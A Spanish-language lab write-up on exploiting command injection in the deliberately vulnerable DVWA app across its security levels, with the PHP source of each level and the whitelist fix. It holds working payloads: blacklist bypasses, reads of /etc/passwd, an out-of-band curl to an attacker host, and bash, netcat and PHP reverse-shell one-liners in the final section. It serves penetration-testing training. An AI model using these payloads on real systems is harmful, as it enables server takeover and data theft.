# Command injection en DVWA

## Índice

1. [¿Qué es Command Injection?](#1-qué-es-command-injection)
   - [Tipos de inyección de comandos](#11-tipos-de-inyección-de-comandos)
2. [Metacaracteres y separadores de comandos](#2-metacaracteres-y-separadores-de-comandos)
   - [Payloads de reconocimiento útiles](#21-payloads-de-reconocimiento-útiles)
3. [Command Injection en acción — nivel low](#3-command-injection-en-acción--nivel-low)
   - [Análisis del código fuente — nivel low](#31-análisis-del-código-fuente--nivel-low)
4. [Nivel de seguridad medium](#4-nivel-de-seguridad-medium)
   - [Análisis del código fuente — nivel medium](#41-análisis-del-código-fuente--nivel-medium)
   - [Fuzzing con Burp Suite Repeater e Intruder](#42-fuzzing-con-burp-suite-repeater-e-intruder)
5. [Nivel de seguridad high](#5-nivel-de-seguridad-high)
   - [Análisis del código fuente — nivel high](#51-análisis-del-código-fuente--nivel-high)
6. [Blind Injection](#6-blind-injection)
   - [Técnica: retardo temporal](#61-técnica-retardo-temporal)
   - [Técnica: redirección de salida a fichero](#62-técnica-redirección-de-salida-a-fichero)
   - [Técnica: out of band](#63-técnica-out-of-band)
7. [Prevención — nivel impossible](#7-prevención--nivel-impossible)
   - [Análisis del código fuente — nivel impossible](#71-análisis-del-código-fuente--nivel-impossible)
8. [De Command Injection a reverse shell](#8-de-command-injection-a-reverse-shell)

---

## 1. ¿Qué es Command Injection?

La **Inyección de Comandos** (*Command Injection*) es un tipo de vulnerabilidad que ocurre en aplicaciones web cuando los atacantes pueden ejecutar comandos del sistema operativo en el servidor web a través de la entrada proporcionada por el usuario. Aunque el atacante ejecutará los comandos con los privilegios del servidor web (p.e. `www-data`), es muy probable que pueda acceder a datos confidenciales, ejecutar comandos dañinos o tomar el control total del sistema mediante una escalada de privilegios.

Esta vulnerabilidad es un ejemplo de **Remote Code Execution (RCE)**, ya que el atacante es capaz de ejecutar comandos del sistema sin tener acceso directo al equipo, es decir, sin tener acceso a una terminal interactiva en él. El objetivo de un ataque de inyección de comandos es inyectar y ejecutar comandos en la aplicación web vulnerable, convirtiéndola en una especie de pseudo-terminal.

Esta vulnerabilidad aparecerá cuando la aplicación web usa funciones que hacen llamadas al sistema operativo y además no se controlan correctamente los parámetros que se les pasan. Lenguajes como PHP, Python o NodeJS ofrecen este tipo de funciones, como pueden ser `shell_exec()`, `exec()` o `system()` en el caso de PHP.

Supongamos que una aplicación web en PHP permite a los usuarios buscar archivos en el servidor con el siguiente código:

```php
<?php
if (isset($_GET['search'])) {
    $query = $_GET['search'];
    $result = shell_exec("ls /var/www/html/repo/ | grep " . $query);
    echo "Resultados de la búsqueda:<br>";
    echo "<pre>$result</pre>";
}
?>
```

Este código toma la entrada del usuario desde el parámetro `search` en la URL y la utiliza en la función `shell_exec()` para buscar archivos en un directorio específico. Un ejemplo de petición válida sería `http://aplicacion.example/aplicacion/index.php?search=test`, que buscaría los archivos que contengan la palabra `test` (ejecutando `ls /var/www/html/repo/ | grep test`).

El código funciona correctamente, pero es vulnerable a la inyección de comandos, ya que un atacante puede crear una petición como `http://aplicacion.example/aplicacion/index.php?search=test;whoami`. El servidor toma el parámetro `search` y lo pasa a `shell_exec()`, de forma que lo que se ejecutará a nivel de sistema operativo será `ls /var/www/html/repo/ | grep test;whoami`. Teniendo en cuenta que el punto y coma (`;`) separa comandos en los shells de Linux, primero se ejecuta la búsqueda y después el comando `whoami`.

Para que una aplicación sea vulnerable a la inyección de comandos deben cumplirse dos condiciones:

- La aplicación usa funciones que pueden ejecutar comandos del sistema.
- Los parámetros de esa función pueden ser manipulados por el usuario (*client-side*).

---

### 1.1 Tipos de inyección de comandos

En base a la respuesta que proporciona la aplicación se distinguen dos tipos:

| Tipo | Descripción |
|------|-------------|
| **Verbose injection (in-band)** | La aplicación muestra el resultado de la ejecución del payload; la salida del comando es visible en la respuesta. |
| **Blind injection** | La aplicación no muestra el resultado de la ejecución del payload. El comando sí se ejecuta, pero su salida no se ve reflejada en la página web. |

> **Nota:** En el caso de *Blind injection*, hay que investigar el comportamiento de la aplicación web para determinar si el payload está ejecutándose o no. Las técnicas más habituales son: retardo temporal, redirección de salida a fichero y *out of band*. Se explican en detalle en la sección 6.

---

## 2. Metacaracteres y separadores de comandos

Los siguientes metacaracteres actúan como separadores de comandos y son los más utilizados en ataques de inyección:

| Metacaracter | Nombre | Comportamiento |
|--------------|--------|----------------|
| `;` | Punto y coma | Permite la ejecución secuencial de varios comandos. |
| `&` | Background | Ejecuta el comando en segundo plano. |
| `&&` | AND | Ejecuta el segundo comando solo si el primero termina con éxito (devuelve `0`). |
| `\|` | Pipe | Toma la salida del primer comando y la usa como entrada del segundo. |
| `\|\|` | OR | Ejecuta el segundo comando únicamente si el primero falla (devuelve `1`). |
| `\n` / `%0A` | Nueva línea | Separador de comandos equivalente a `;` en shells Unix/Linux. |
| `` `comando` `` | Inline execution | Ejecuta el comando incrustado dentro del comando original. |
| `$(comando)` | Inline execution | Alternativa a los backticks para ejecución inline. |

> **Nota:** `&&` ejecuta el segundo comando únicamente si el anterior devuelve `true` (código de salida `0`), mientras que `||` ejecuta el segundo solo si el previo falla (código de salida `1`). Esta diferencia es relevante a la hora de elegir el separador más adecuado para el contexto del ataque.

> **Nota:** Puede resultar útil colocar un separador adicional `&` o el carácter de comentario `#` después del comando inyectado para separarlo del texto que lo sigue en la URL o en el parámetro, evitando que interfiera con la ejecución del payload.

> **Importante:** En ocasiones, la entrada que controla el atacante aparece entrecomillada en el comando original, lo que obliga a cerrar las comillas (con `"` o `'`) antes de usar los metacaracteres para insertar un nuevo comando.

---

### 2.1 Payloads de reconocimiento útiles

Cuando se detecta una vulnerabilidad de inyección de comandos, suele ser interesante ejecutar algunos comandos iniciales para obtener más información del sistema comprometido:

| Propósito | Linux | Windows |
|-----------|-------|---------|
| Ver usuario efectivo | `whoami` | `whoami` |
| Información sobre el sistema operativo | `uname -a` | `ver` |
| Listar contenido del directorio | `ls` | `dir` |
| Configuración de red | `ifconfig` o `ip addr` | `ipconfig /all` |
| Conexiones de red | `netstat -putan` o `ss -tua` | `netstat -an` |
| Procesos en ejecución | `ps -ef` | `tasklist` |
| Retardo temporal (útil para Blind injection) | `sleep` | `timeout` |
| Ping (útil para Blind injection) | `ping` | `ping` |

---

## 3. Command Injection en acción — nivel low

Configurar el nivel de seguridad en DVWA a `Low` y acceder a la sección `Command Injection`, donde aparece un formulario que permite indicar una dirección IP a la que se hará ping.

Para comprobar el funcionamiento normal se introduce una dirección IP, por ejemplo la de loopback `127.0.0.1` o la IP de la máquina Kali. La aplicación ejecuta `ping -c 4 127.0.0.1` y muestra la salida directamente en la página.

![Ejecución 1](./imagenes/command%20injection/01.png)

A continuación se prueban distintos metacaracteres para inyectar comandos adicionales:

**Con `;`:**

```bash
127.0.0.1 ; whoami
```

La aplicación ejecuta el ping y a continuación el comando `whoami`, mostrando que corre bajo el usuario `www-data`. Se trata de una **Verbose injection**, ya que la salida del payload es visible en la respuesta.

![Ejecución 2](./imagenes/command%20injection/02.png)

**Con `&&`:**

```bash
127.0.0.1 && whoami && hostname && ip addr && ls -lhF
```

Encadena múltiples comandos: el segundo y siguientes solo se ejecutan si el anterior tuvo éxito. Permite obtener en una sola inyección el usuario, el hostname, la configuración de red y el listado del directorio actual.

![Ejecución 3](./imagenes/command%20injection/03.png)

**Con `|`:**

```bash
127.0.0.1 | cat /etc/passwd
```

El pipe redirige la salida del `ping` como entrada de `cat`, pero en la práctica lo que se ve en la respuesta es la salida de `cat /etc/passwd`, exponiendo los usuarios del sistema.

![Ejecución 4](./imagenes/command%20injection/04.png)

> **Advertencia:** El archivo `/etc/passwd` en sistemas Linux expone los nombres de usuario del sistema, sus IDs, directorios home y shells. Aunque las contraseñas no se almacenan en este archivo (están en `/etc/shadow`), su lectura es útil para un atacante en la fase de reconocimiento.

---

### 3.1 Análisis del código fuente — nivel low

```php
<?php

if( isset( $_POST[ 'Submit' ] ) ) {
    // Get input
    $target = $_REQUEST[ 'ip' ];

    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }

    // Feedback for the end user
    echo "<pre>{$cmd}</pre>";
}

?>
```

El código recoge la dirección IP indicada por el usuario en el parámetro `ip` y determina el sistema operativo usando `php_uname()` para seleccionar el comando `ping` adecuado, al que le pasa la dirección IP directamente. La función `shell_exec()` ejecuta el comando resultante sin ningún tipo de validación o limpieza de la entrada del usuario.

El problema radica en que **la entrada del usuario se concatena directamente en la función `shell_exec()`**, permitiendo la inyección de cualquier metacaracter y comando adicional.

---

## 4. Nivel de seguridad medium

En el nivel `medium`, el programador protege la aplicación contra la inyección de comandos filtrando la entrada del usuario. Los dos delimitadores usados en el nivel anterior quedan bloqueados:

- `127.0.0.1 ; whoami` → falla, el `;` es eliminado.
- `127.0.0.1 && whoami` → falla, `&&` es eliminado.

Sin embargo, el filtrado no es completo, ya que permite el uso de otros delimitadores:

**Con `&`:**

```bash
127.0.0.1 & whoami
```

El carácter `&` lleva la ejecución del `ping` a segundo plano y procede a ejecutar el comando inyectado `whoami`.

![Ejecución 5](./imagenes/command%20injection/05.png)

**Con `|`:**

```bash
127.0.0.1 | whoami
```

El pipe convierte la salida del primer comando en la entrada del segundo, ejecutando `whoami`.

![Ejecución 6](./imagenes/command%20injection/06.png)

**Con `||`:**

```bash
|| whoami
```

![Ejecución 7](./imagenes/command%20injection/07.png)


Al no indicar una dirección IP, el comando `ping` falla, y `||` provoca la ejecución del comando inyectado `whoami`. No hace falta ni introducir una IP válida como prefijo.

> **Nota:** El problema fundamental de las **listas negras** (*blacklists*) es que cualquier entrada no recogida en la lista será autorizada. Un error u omisión al crearla hace que la aplicación siga siendo vulnerable a los metacaracteres no contemplados.

---

### 4.1 Análisis del código fuente — nivel medium

```php
<?php

if( isset( $_POST[ 'Submit' ] ) ) {
    // Get input
    $target = $_REQUEST[ 'ip' ];

    // Set blacklist
    $substitutions = array(
        '&&' => '',
        ';'  => '',
    );

    // Remove any of the characters in the array (blacklist).
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );

    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }

    // Feedback for the end user
    echo "<pre>{$cmd}</pre>";
}

?>
```

La lista negra solo filtra `&&` y `;`, dejando sin cubrir `&`, `|` y `||`, entre otros. La función `str_replace()` elimina las cadenas bloqueadas de la entrada antes de pasarla a `shell_exec()`, pero al no contemplar todos los metacaracteres posibles, el filtrado es incompleto.

---

### 4.2 Fuzzing con Burp Suite Repeater e Intruder

Las pruebas de inyección de comandos pueden realizarse de forma manual con **Burp Suite Repeater** o automatizarse con **Intruder**.

**Con Repeater:**

1. Capturar una petición del formulario vulnerable con Burp Suite.
2. Hacer clic derecho y seleccionar `Send to Repeater` (`Ctrl+R`).
3. En la sección Repeater, modificar el parámetro `ip` con el payload a probar, por ejemplo `127.0.0.1|whoami&Submit=Submit`.
4. Pulsar `Send` y revisar la respuesta. El modo `Render` permite ver rápidamente si el payload funcionó al visualizar la respuesta como un navegador.

**Con Intruder:**

1. Capturar una petición y enviarla a Intruder (`Ctrl+I`).
2. Seleccionar el ataque `Sniper`.
3. Limpiar las posiciones con `Clear §` y marcar como posición del payload el valor a continuación de la dirección IP.
4. En la pestaña `Payloads`, cargar la lista de payloads de inyección de comandos disponible en [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/Intruder/command-execution-unix.txt).
5. Lanzar el ataque con `Start attack` y analizar los resultados prestando especial atención al campo `Length`:

| Resultado | Tamaño aproximado de la respuesta |
|-----------|----------------------------------|
| Ping exitoso, pero inyección fallida | ~5092 bytes |
| Error: ni ping ni inyección | ~4670 bytes |
| Inyección exitosa | Valor diferente a los anteriores (~4724 bytes para `\|id`) |

Las respuestas con un tamaño diferente a los valores de referencia son las candidatas a revisión manual.

![Ataque de inyección de comandos con diccionario](./imagenes/command%20injection/08.png)

> **Nota:** Algunos payloads exitosos identificados en el nivel medium son: `|id`, `a|id`, `%0Acat%20/etc/passwd`, `%0A/usr/bin/id` y `%0Aid`.

---

## 5. Nivel de seguridad high

En el nivel `high`, el programador amplía considerablemente la lista negra, pero comete un error al filtrar el metacaracter `|` con un espacio en blanco detrás (`'| '`), en lugar del carácter solo (`'|'`). Esto permite la inyección sin espacio:

```bash
127.0.0.1|whoami
```

Mientras que con espacio falla:

```bash
127.0.0.1 | whoami
```

Adicionalmente, es posible saltarse el filtro usando el salto de línea en URL encode (`%0A`):

```bash
127.0.0.1%0Awhoami
```

> **Nota:** El salto de línea (`\n`, `%0A` en URL encode) es un separador de comandos válido en shells Unix/Linux que habitualmente no aparece en las listas negras más básicas, convirtiéndolo en un bypass habitual.

---

### 5.1 Análisis del código fuente — nivel high

```php
<?php

if( isset( $_POST[ 'Submit' ] ) ) {
    // Get input
    $target = trim($_REQUEST[ 'ip' ]);

    // Set blacklist
    $substitutions = array(
        '&'  => '',
        ';'  => '',
        '| ' => '',
        '-'  => '',
        '$'  => '',
        '('  => '',
        ')'  => '',
        '`'  => '',
        '||' => '',
    );

    // Remove any of the characters in the array (blacklist).
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );

    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }

    // Feedback for the end user
    echo "<pre>{$cmd}</pre>";
}

?>
```

La clave del bypass está en la entrada `'| ' => ''`: el filtro elimina el pipe seguido de un espacio, pero no el pipe solo. Así, `127.0.0.1|whoami` (sin espacio) no es interceptado. Además, el salto de línea (`%0A`) no aparece en la lista, lo que permite otro vector de ataque.

> **Advertencia:** Este es un ejemplo clásico del peligro de las listas negras: basta un error de un carácter para que el filtro quede inutilizado. La solución robusta no es ampliar la lista negra sino usar listas blancas que validen el formato exacto de la entrada esperada.

---

## 6. Blind Injection

En el caso de una **Blind injection**, la aplicación no muestra el resultado de la ejecución del payload. El comando sí se ejecuta en el servidor, pero su salida no se ve reflejada en la página web devuelta por la aplicación.

Para detectar si la aplicación es vulnerable en estos casos, se pueden seguir varias estrategias:

---

### 6.1 Técnica: retardo temporal

Consiste en inyectar un payload que introduzca un retardo usando comandos como `sleep` o `ping`. Si la respuesta tarda más de lo esperado, la inyección ha funcionado.

Primero se mide el tiempo de respuesta normal haciendo ping a `127.0.0.1` (aproximadamente 3 segundos con 4 paquetes). A continuación se inyecta un retardo adicional de 10 segundos:

```bash
127.0.0.1 && sleep 10
```

Si no hubiera inyección de comandos, la página cargaría en ~3 segundos. En caso de Blind injection, la página tardará ~13 segundos en responder, confirmando la vulnerabilidad.

> **Nota:** Esta técnica no requiere ver ninguna salida en la respuesta, por lo que funciona tanto en Verbose como en Blind injection. Es la forma más sencilla de confirmar la existencia de la vulnerabilidad antes de intentar exfiltrar datos.

---

### 6.2 Técnica: redirección de salida a fichero

Consiste en inyectar un payload que produzca una salida y redireccionarla a un fichero en una ruta accesible desde el navegador, para posteriormente verificar su existencia.

Aprovechando que Apache puede escribir en el directorio `hackable/uploads`, se redirige la salida del comando `date` a un fichero `hack.txt`:

```bash
127.0.0.1 && date > /var/www/html/dvwa/hackable/uploads/redireccion.html
```

Tras ejecutar el payload, se accede desde el navegador a `http://192.168.100.4/dvwa/hackable/uploads/redireccion.html`. Si el fichero existe y contiene la fecha del sistema, la inyección ha sido exitosa.

![Ejecución de la redirección](./imagenes/command%20injection/09.png)

![Contenido del fichero](./imagenes/command%20injection/10.png)

> **Nota:** Esta técnica requiere que el proceso del servidor web tenga permisos de escritura en el directorio destino. En DVWA el directorio `hackable/uploads` está habilitado para ello. En entornos reales, identificar directorios escribibles es parte de la fase de reconocimiento posterior a la confirmación de la vulnerabilidad.

---

### 6.3 Técnica: out of band

Consiste en inyectar un payload que haga que la aplicación vulnerable genere una solicitud TCP/UDP/ICMP saliente hacia un sistema controlado por el atacante. Si ese tráfico llega, confirma la vulnerabilidad.

El éxito de esta técnica depende de las reglas salientes del firewall de la organización: la solicitud saliente debe estar autorizada tanto en el sistema vulnerable como en el firewall perimetral.

En el equipo atacante (Kali) se levanta un servidor HTTP con Python:

```bash
kali@kali:~$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Se inyecta el siguiente payload para que el servidor DVWA haga una petición HTTP hacia Kali (`192.168.100.250`) en el puerto `8000`:

```bash
127.0.0.1 ; curl http://192.168.100.250:8000/test
```

Si la inyección funciona, en la terminal de Kali aparece la conexión entrante:

```bash
192.168.100.4 - - [22/Jan/2025 21:20:03] "GET /test HTTP/1.1" 200 -
```

> **Nota:** Esta técnica es especialmente útil cuando tanto la aplicación como el firewall bloquean la salida directa del contenido en la respuesta HTTP, pero permiten conexiones salientes en ciertos puertos. Herramientas como `curl`, `wget` o `ping` pueden usarse como vehículo para la exfiltración *out of band*.

---

## 7. Prevención — nivel impossible

El nivel `Impossible` de DVWA proporciona pistas sobre las medidas que deben adoptar los desarrolladores. En lugar del filtrado por lista negra (que permite cualquier entrada y elimina las no deseadas), se utiliza una **lista blanca** (solo se permiten ciertos valores).

Básicamente se comprueba que lo introducido por el usuario es una dirección IP válida:

1. Se divide la cadena proporcionada por el usuario con `explode()` usando como delimitador el punto (`.`).
2. Se comprueba que hay exactamente 4 subcadenas y que cada una de ellas es un número entero; si no lo es, se produce un error.

Adicionalmente, se incorpora un token CSRF para proteger el formulario frente a ataques de falsificación de petición entre sitios.

---

### 7.1 Análisis del código fuente — nivel impossible

```php
<?php

if( isset( $_POST[ 'Submit' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Get input
    $target = $_REQUEST[ 'ip' ];
    $target = stripslashes( $target );

    // Split the IP into 4 octects
    $octet = explode( ".", $target );

    // Check IF each octet is an integer
    if( ( is_numeric( $octet[0] ) ) && ( is_numeric( $octet[1] ) ) && ( is_numeric( $octet[2] ) ) && ( is_numeric( $octet[3] ) ) && ( sizeof( $octet ) == 4 ) ) {
        // If all 4 octets are int's put the IP back together.
        $target = $octet[0] . '.' . $octet[1] . '.' . $octet[2] . '.' . $octet[3];

        // Determine OS and execute the ping command.
        if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
            // Windows
            $cmd = shell_exec( 'ping  ' . $target );
        }
        else {
            // *nix
            $cmd = shell_exec( 'ping  -c 4 ' . $target );
        }

        // Feedback for the end user
        echo "<pre>{$cmd}</pre>";
    }
    else {
        // Ops. Let the user name theres a mistake
        echo '<pre>ERROR: You have entered an invalid IP.</pre>';
    }
}

// Generate Anti-CSRF token
generateSessionToken();

?>
```

Como resumen, las medidas recomendadas para evitar las vulnerabilidades de inyección de comandos son:

- **Evitar el uso de funciones vulnerables** y la ejecución de comandos del sistema siempre que existan alternativas (p.e. usar funciones nativas del lenguaje en lugar de llamadas al sistema).
- **Validación de entradas de usuario:**
  - Uso de listas blancas con los valores permitidos.
  - Comprobación de que la entrada se corresponde con el tipo de valor esperado.
  - Comprobación del uso exclusivo de caracteres alfanuméricos, eliminando caracteres considerados peligrosos.

> **Importante:** La diferencia clave entre el nivel *impossible* y los niveles anteriores es el cambio de paradigma: en lugar de intentar detectar y eliminar entradas maliciosas (lista negra), se define exactamente qué es una entrada válida (lista blanca) y se rechaza todo lo demás. Este enfoque es significativamente más robusto, ya que no depende de anticipar todos los vectores de ataque posibles.

---

## 8. De Command Injection a reverse shell

A partir de una vulnerabilidad de inyección de comandos es relativamente sencillo obtener una **reverse shell** en el equipo vulnerable. Con el nivel de seguridad en `Low` y sin ningún filtrado para controlar metacaracteres especiales, es posible usar una *one-line reverse shell*.

Como referencia se puede usar el [Reverse Shell Cheatsheet de PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) o [https://www.revshells.com/](https://www.revshells.com/).

**Con bash:**

```bash
127.0.0.1; bash -c "bash -i >& /dev/tcp/192.168.100.250/5555 0>&1"
```

**Con netcat:**

```bash
||rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.100.250 5555 >/tmp/f
```

**Con PHP** (sabiendo que el equipo corre PHP):

```bash
||php -r '$sock=fsockopen("192.168.100.250",5555);exec("/bin/sh -i <&3 >&3 2>&3");'
```

En el equipo atacante (Kali) se pone a escuchar `nc` en el puerto `5555`:

```bash
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 5555
$ whoami
www-data
$ hostname
web00
$
```

Al inyectar el payload en el formulario, el servidor DVWA establece una conexión saliente hacia Kali, proporcionando una shell interactiva con los privilegios de `www-data`.

![Reverse Shell](./imagenes/command%20injection/11.png)

> **Advertencia:** Una reverse shell otorga al atacante una terminal interactiva en el servidor. A partir de ese punto, el siguiente objetivo suele ser una **escalada de privilegios** para obtener acceso como `root`. Desde una reverse shell con `www-data` es posible leer ficheros de configuración, credenciales de bases de datos, claves SSH u otros datos sensibles accesibles con ese nivel de permisos.